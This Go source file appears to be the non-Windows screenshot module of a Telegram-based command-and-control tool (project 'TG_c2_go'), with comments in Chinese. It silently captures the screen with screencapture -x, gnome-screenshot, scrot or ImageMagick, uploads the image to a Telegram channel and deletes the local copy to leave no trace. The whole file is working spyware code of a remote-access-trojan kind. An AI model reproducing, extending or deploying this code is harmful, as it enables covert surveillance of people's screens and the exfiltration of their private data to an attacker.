//go:build !windows

package functions

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"

	"TG_c2_go/config"
	"TG_c2_go/telegram"
)

// ScreenCapture 屏幕截图功能
type ScreenCapture struct {
	client *telegram.TelegramClient
}

// NewScreenCapture 创建新的屏幕截图器
func NewScreenCapture() *ScreenCapture {
	return &ScreenCapture{
		client: telegram.NewTelegramClient(),
	}
}

// TakeScreenshot 执行屏幕截图并发送到Telegram (使用系统命令)
func (sc *ScreenCapture) TakeScreenshot() error {
	fmt.Println("开始截图...")
	
	screenshotPath := filepath.Join(config.OUTPUT_DIR, "screenshot.png")
	
	var cmd *exec.Cmd
	switch runtime.GOOS {
	case "darwin":
		// macOS使用screencapture命令
		cmd = exec.Command("screencapture", "-x", screenshotPath)
	case "linux":
		// Linux尝试使用不同的截图工具
		if _, err := exec.LookPath("gnome-screenshot"); err == nil {
			cmd = exec.Command("gnome-screenshot", "-f", screenshotPath)
		} else if _, err := exec.LookPath("scrot"); err == nil {
			cmd = exec.Command("scrot", screenshotPath)
		} else if _, err := exec.LookPath("import"); err == nil {
			// ImageMagick的import命令
			cmd = exec.Command("import", "-window", "root", screenshotPath)
		} else {
			return fmt.Errorf("未找到可用的截图工具，请安装 gnome-screenshot, scrot 或 imagemagick")
		}
	default:
		return fmt.Errorf("不支持的操作系统: %s", runtime.GOOS)
	}
	
	// 执行截图命令
	if err := cmd.Run(); err != nil {
		return fmt.Errorf("截图命令执行失败: %v", err)
	}
	
	fmt.Printf("截图已保存到: %s\\n", screenshotPath)
	
	// 发送截图到Telegram
	fmt.Println("正在上传截图到Telegram...")
	err := sc.client.SendPhoto(screenshotPath)
	if err != nil {
		fmt.Printf("上传截图失败: %v\\n", err)
		return err
	}
	
	// 删除本地截图文件
	if err := os.Remove(screenshotPath); err != nil {
		fmt.Printf("删除截图文件失败: %v\\n", err)
	} else {
		fmt.Println("截图文件已删除")
	}
	
	fmt.Println("截图上传完成")
	return nil
}
